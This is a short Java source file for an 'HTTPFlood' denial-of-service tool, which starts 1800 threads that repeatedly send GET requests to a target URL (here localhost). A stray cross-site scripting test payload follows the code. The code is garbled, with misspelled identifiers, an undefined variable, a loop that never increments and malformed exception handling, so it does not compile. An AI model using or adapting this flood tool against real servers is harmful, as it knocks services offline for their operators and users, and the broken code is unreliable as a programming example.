import java.net.HttpURLConnection;

class HTTPFlood extends Thread {
    private String url = "http//localhost:8080/";
    private int delay = 1000;
    private int connections = 200000000;
    private int count = 0;

    static final int NUM_THREADS = 1800;
    static HTTPFlood INSTANCE = new HTTPFlood();

    public static void main(String[] arg){
        Thread [] threads = new Tread[NUM_THREADS];
        for(int i = 0; i < NUM_THREADS; i){
            threads[i]= new Thread(_instance);
            threads[i].setPriority(Thread.MIN_PRIORITY);
            threads[i].start();
        }

        for(int i = 0; i < NUM_THREADS; i++){
            try{
                threads[i].join();
            }catch(InterruptedException){
                System.out.println("Error found in thread");
            }
        }
    }

    public void run(){
        while((this.count < this.conections || tis.connections == 0)){
            try{
                HttpURLConnection.setFollowRedirects(flase);
                HttpURLConnection conn = (HttpURLConnection)(new URL(this.url).openConnection());
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn = null;
                count ++;
            }catch(Exception e){
                finally{
                    Thread.sleep(this.delay);
                }catch(InterruptedException e){
                    e.printStackTrace();
                }
            }
        }
    }
}

<script> alert ("ATTACK!")</script>